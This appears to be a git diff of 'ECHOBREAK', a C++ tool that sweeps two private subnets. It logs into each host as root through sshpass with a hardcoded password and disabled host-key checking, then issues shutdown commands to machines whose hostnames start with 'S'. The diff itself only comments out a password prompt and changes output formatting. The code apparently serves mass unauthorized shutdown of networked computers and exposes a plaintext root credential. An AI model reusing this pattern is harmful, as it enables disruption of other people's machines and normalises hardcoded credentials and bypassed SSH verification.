@@ -89,11 +89,20 @@ inline std::string connect(std::string host, std::string command){
 }
 
 int main(int argc, char* argv[]){	
+	/*
+	//that if gomunkul sovsem ahueet
+	std::string pass;
+	std::hash<std::string> hash;
+	std::cout << "Enter the password: ";
+	std::cin >> pass;
+	if(hash(pass) != 7067835266441158162) return 1;*/
+
 	std::cout << "W3LC0M T0 \033[095mECHOBREAK\033[0m!!" << std::endl;
 	std::string command;
 	std::vector<std::string> hosts;
 	time_t start, end;
 	int total = 0;
+
 	time(&start);
 	if(argc <= 1){
 		std::cout << "Enter: scan, setup, connect\n ";
@@ -156,7 +165,7 @@ int main(int argc, char* argv[]){
 				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " hostname"; //command
 			    host = exec(command.c_str());
 				if(host[0] == 'S'){
-					std::cout << host << " ";
+					std::cout << host << "\n";
 					++total;
 					system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + " shutdown " + time).c_str());
 				}
@@ -166,7 +175,7 @@ int main(int argc, char* argv[]){
 				command = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " hostname"; //command
 				host = exec(command.c_str());
 				if(host[0] == 'S'){
-					std::cout << host << " ";
+					std::cout << host << "\n";
 					++total;
 					system(("sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + " shutdown " + time).c_str());
 				}
